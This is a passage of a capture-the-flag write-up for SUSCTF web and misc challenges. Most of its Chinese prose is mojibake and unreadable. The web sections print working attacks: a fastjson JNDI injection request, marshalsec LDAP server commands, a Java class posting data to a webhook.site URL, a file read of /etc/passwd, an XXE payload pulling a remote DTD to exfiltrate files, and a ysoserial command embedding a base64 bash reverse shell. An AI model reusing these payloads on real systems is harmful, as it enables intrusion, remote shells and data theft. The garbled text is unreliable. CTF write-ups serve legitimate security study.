</span></span><span class=line><span class=cl><span class=k>switch</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$g_4</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nv>$f_sub</span><span class=p>(</span><span class=s1>&#39;2624yAXHpMmO&#39;</span><span class=p>,</span> <span class=mi>2623</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nv>$g_4</span> <span class=o>=</span> <span class=nv>$fclosure_8</span><span class=p>(</span><span class=s1>&#39;parse_str&#39;</span><span class=p>(</span><span class=s1>&#39;BOFs=L2ZsYWc=&#39;</span><span class=p>,</span> <span class=nv>$oIZrLxSJ</span><span class=p>),</span> <span class=nv>$oIZrLxSJ</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;base64_decode&#39;</span><span class=p>(</span><span class=nv>$oIZrLxSJ</span><span class=p>[</span><span class=s1>&#39;BOFs&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=nv>$oIZrLxSJ</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nv>$f_sub</span><span class=p>(</span><span class=s1>&#39;41PvInuuZE&#39;</span><span class=p>,</span> <span class=mi>39</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nv>$g_5</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=nv>$g_2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nv>$f_sub</span><span class=p>(</span><span class=s1>&#39;4753VUgALPCe&#39;</span><span class=p>,</span> <span class=mi>4750</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$g_5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nv>$f_add</span><span class=p>(</span><span class=nv>$f_shl</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span><span class=o>:</span> <span class=c1>// I chose to go down this branch
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$DqWdnYFI</span> <span class=o>=</span> <span class=nv>$fclosure_8</span><span class=p>(</span><span class=s1>&#39;parse_str&#39;</span><span class=p>(</span><span class=s1>&#39;ISzI=ZkZzZXBhTVc=&#39;</span><span class=p>,</span> <span class=nv>$FKFDXVHC</span><span class=p>),</span> <span class=nv>$FKFDXVHC</span><span class=p>)</span> <span class=o>?</span> <span class=s1>&#39;base64_decode&#39;</span><span class=p>(</span><span class=nv>$FKFDXVHC</span><span class=p>[</span><span class=s1>&#39;ISzI&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=nv>$FKFDXVHC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$f_and</span><span class=p>(</span><span class=nv>$f_and</span><span class=p>(</span><span class=nv>$f_and</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$DqWdnYFI</span><span class=p>],</span> <span class=nv>$f_eq</span><span class=p>(</span><span class=nv>$g_5</span><span class=p>,</span> <span class=nv>$g_4</span><span class=p>)),</span> <span class=nv>$f_greater</span><span class=p>(</span><span class=nv>$g_1</span><span class=p>,</span> <span class=nv>$f_sub</span><span class=p>(</span><span class=s1>&#39;7299EPrJnVdz&#39;</span><span class=p>,</span> <span class=mi>6299</span><span class=p>))),</span> <span class=o>!</span><span class=s1>&#39;strpos&#39;</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$DqWdnYFI</span><span class=p>],</span> <span class=s1>&#39;/flag&#39;</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;readfile&#39;</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nv>$DqWdnYFI</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Iâ€™ve renamed variables that we might control as $g_x. We can either control g_4 or g_5. But controlling g_5 loses us control over the big switch so I chose to control g_4. to get flag using final <code>readfile</code> g_5 needs to be equal to g_4. Thereâ€™s more so I wonâ€™t bore you with itâ€¦
Basically after going though many cases Iâ€™ve figured out final parameters that was needed for solution:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Apache data-lang=Apache><span class=line><span class=cl><span class=err>JnXB=1001&amp;xMSd=10&amp;kgdG=-294&amp;1001=717&amp;717=4&amp;fFsepaMW=/</span><span class=nb>flag</span>
</span></span></code></pre></td></tr></table></div></div><p>Itâ€™s just case work and not really interesting. It took me 2 restarts of the challenge so about 4-5 hours.</p><h2 id=baby-gadget-v10>baby gadget v1.0</h2><p><code>/;/admin</code> å¯ä»¥ç»•è¿‡ç™»å½•ï¼Œä½†æ˜¯å¾—åœ¨ burp ï¼Œæµè§ˆå™¨ä¼šè¢«è·³è½¬</p><blockquote><p>åœ¨é˜Ÿå‹çš„ Fuzz ä¸‹å‘ç° å¯†ç  æ˜¯ä¸ª å¼±å¯†ç  admin:admin123
å‘ç° /;/admin/download.jsp?filename=lib.zip ä¸‹åˆ°äº†ä¾èµ–ï¼Œçœ‹åˆ°æœ‰ fastjson ï¼Œä¸€é¡¿æœã€‚ç„¶åæ ¹æ® <a href=https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/>çº¢é˜Ÿæ­¦å™¨åº“: fastjson å°äº 1.2.68 å…¨æ¼æ´RCEåˆ©ç”¨ exploit</a> ç›´æ¥è¯•ä¸€ä¸‹èƒ½ä¸èƒ½äº§ç”Ÿ dnslog</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;abc&#34;</span><span class=p>:{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;java.net.Inet4Address&#34;</span><span class=p>,</span><span class=nt>&#34;val&#34;</span><span class=p>:</span><span class=s2>&#34;xxx.dnslog.cn&#34;</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä½†æ˜¯æ¯”è¾ƒè›‹ç–¼çš„æ˜¯æˆ‘è¿™ä¸ªè„šæœ¬å°å­ç”¨ä¸€äº› JNDI å·¥å…·ç«Ÿç„¶æ‰“ä¸äº†ï¼Œè§¦å‘äº†æ¶æ„ç±»è®¿é—®ä½†æ˜¯æ²¡åå¼¹å›æ¥ shell ï¼Œäºæ˜¯æ ¹æ®æ–‡ç« è‡ªå·±æ‰‹åŠ¨æ­å»ºä¸€ä¸ªæ¶æ„çš„æœåŠ¡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/;/admin/mailbox.jsp</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>124.71.187.127:20012</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>115</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>inputtext={&#34;@type&#34;:&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;,&#34;AsText&#34;:&#34;ldap://ip:port/Exploit&#34;}}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>java</span> <span class=o>-</span><span class=n>cp</span> <span class=n>marshalsec</span><span class=o>-</span><span class=mf>0.0.3</span><span class=o>-</span><span class=n>SNAPSHOT</span><span class=o>-</span><span class=nb>all</span><span class=o>.</span><span class=n>jar</span> <span class=n>marshalsec</span><span class=o>.</span><span class=n>jndi</span><span class=o>.</span><span class=n>LDAPRefServer</span> <span class=s2>&#34;http://ip:8888/#Exploit&#34;</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>m</span> <span class=n>http</span><span class=o>.</span><span class=n>server</span> <span class=o>--</span><span class=n>bind</span> <span class=mf>0.0.0.0</span> <span class=mi>8888</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Exploit</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;test&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>URL</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>URL</span><span class=p>(</span><span class=s>&#34;https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>params</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LinkedHashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>params</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;msg&#34;</span><span class=p>,</span><span class=w> </span><span class=n>str</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>postData</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>param</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>params</span><span class=p>.</span><span class=na>entrySet</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>postData</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>postData</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=sc>&#39;&amp;&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>postData</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>URLEncoder</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>param</span><span class=p>.</span><span class=na>getKey</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>postData</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=sc>&#39;=&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>postData</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>URLEncoder</span><span class=p>.</span><span class=na>encode</span><span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>param</span><span class=p>.</span><span class=na>getValue</span><span class=p>()),</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>postDataBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>postData</span><span class=p>.</span><span class=na>toString</span><span class=p>().</span><span class=na>getBytes</span><span class=p>(</span><span class=s>&#34;UTF-8&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HttpURLConnection</span><span class=w> </span><span class=n>conn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>HttpURLConnection</span><span class=p>)</span><span class=n>url</span><span class=p>.</span><span class=na>openConnection</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=na>setRequestMethod</span><span class=p>(</span><span class=s>&#34;POST&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=na>setRequestProperty</span><span class=p>(</span><span class=s>&#34;Content-Type&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=na>setRequestProperty</span><span class=p>(</span><span class=s>&#34;Content-Length&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>postDataBytes</span><span class=p>.</span><span class=na>length</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=na>setDoOutput</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>().</span><span class=na>write</span><span class=p>(</span><span class=n>postDataBytes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reader</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>conn</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å‘ç°å¯ä»¥äº§ç”Ÿè¯·æ±‚ï¼Œäºæ˜¯åˆšå¼€å§‹å°è¯•åˆ—ç›®å½•ï¼Œå¤±è´¥ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>try</span><span class=p>{</span><span class=w>      
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>File</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=s>&#34;/var&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>File</span><span class=o>[]</span><span class=w> </span><span class=n>paths</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>listFiles</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>paths</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>paths</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>str</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>paths</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;,&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;,&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç”¨ <code>try/catch</code> å‘ç°æ˜¯ä¸ªä¸çŸ¥é“ä»€ä¹ˆé¬¼ <code>java.lang.reflect.InvocationTargetException</code> çš„æŠ¥é”™ï¼Œå¯èƒ½æ˜¯ä»€ä¹ˆ waf ï¼Œæ²¡ç»†ç©¶ï¼Œç›´æ¥è¯» /flag ï¼Œå‘ç°å¯ä»¥è¯»åˆ°ï¼Œå®Œäº‹ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>File</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=s>&#34;/etc/passwd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Scanner</span><span class=w> </span><span class=n>sc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Scanner</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>sc</span><span class=p>.</span><span class=na>hasNextLine</span><span class=p>()){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>str</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>sc</span><span class=p>.</span><span class=na>nextLine</span><span class=p>();</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>//ä½ è¦é—®æˆ‘ä¸ºå•¥è¡Œï¼Œä¿ºä¹Ÿä¸çŸ¥é“ï¼Œä¿ºå°±æ˜¯ä¸ªè„šæœ¬å°å­ hhhh</p><h2 id=baby-gadget-v10s-rrrevenge>baby gadget v1.0&rsquo;s rrrevenge</h2><p>åŒä¸Šåšæ³•</p><h2 id=baby-gadget-v20>baby gadget v2.0</h2><p>ç™»é™†æŠ“åŒ…å‘ç° xxeï¼Œç®€å•æµ‹è¯•åå‘ç°æœ‰ wafï¼Œç”¨ utf-16be å¯ä»¥ç»•ï¼Œä¾ç…§æç¤ºè¯» hint.txt å‘ç°æç¤º nameè¿‡é•¿ï¼Œç”¨dtdå¤–å¸¦å³å¯ï¼š
æ–‡ä»¶ xxe.xml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-XML data-lang=XML><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34; ?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE users[
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % file SYSTEM &#34;file:///hint.txt&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % remote SYSTEM &#34;http://vps/1.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl>%remote;
</span></span><span class=line><span class=cl>%all;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;&lt;number&gt;</span>123<span class=nt>&lt;/number&gt;&lt;name&gt;</span><span class=ni>&amp;send;</span><span class=nt>&lt;/name&gt;&lt;/user&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>iconè½¬ä¸€ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>iconv -f utf-8 -t utf-16be &lt; xxe.xml &gt; xxe-utf-16.xml
</span></span></code></pre></td></tr></table></div></div><p>é€šè¿‡hintä¸‹è½½åˆ°æºç æ˜¯ java å­—èŠ‚ç  å¯ä»¥ç›´æ¥ååºåˆ—åŒ–ï¼Œå‘ç°æœ‰é»‘åå•ç±»ï¼Œä½†æ²¡æœ‰å¯¹ JRMPListener åšè¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡ jrmp æ‰“ cc å°±å¯ä»¥ç›´æ¥rce</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class=m>2333</span> CommonsCollections5 <span class=s2>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvMjMzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span>
</span></span><span class=line><span class=cl>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient xxx.xxx.xxx.xxx:2333 
</span></span></code></pre></td></tr></table></div></div><h2 id=baby-gadget-v20-revenge>baby gadget v2.0&rsquo; revenge</h2><p>åŒä¸Šåšæ³•</p><h1 id=misc>Misc</h1><h2 id=checkin>Checkin</h2><p>Discordé¢‘é“ç»™æœºå™¨äººç§å‘">flag"å¯ä»¥å¾—åˆ°ä¸€é—ªè€Œè¿‡çš„flagï¼Œè€ƒè™‘ä½¿ç”¨å½•å±æ¥è·å–ã€‚
<img src=/img/2022-2-28-SUSCTF/20220301005625955.jpg alt=img></p><h2 id=ra2>ra2</h2><p>ç›´æ¥ç©æ¸¸æˆå³å¯å¾—åˆ°flagï¼šSUSCTF{RED_ALERT_WINNER!!!}
<img src=/img/2022-2-28-SUSCTF/20220301005626061.jpg alt=img>
<img src=/img/2022-2-28-SUSCTF/20220301005626302.jpg alt=img>
<img src=/img/2022-2-28-SUSCTF/20220301005626167.jpg alt=img>
<img src=/img/2022-2-28-SUSCTF/20220301005626003.jpg alt=img></p><h2 id=tanner>Tanner</h2><p>é¦–å…ˆæ ¹æ®æ ¡éªŒçŸ©é˜µè¿˜åŸç å­—
ç„¶ååœ¨ID3å¤„å‘ç°çš„hintï¼šTHE FLAG IS the sha256 of the sum ofthe proper codewords(binary plus)which satisfy the condition.(note: with no zeros front)
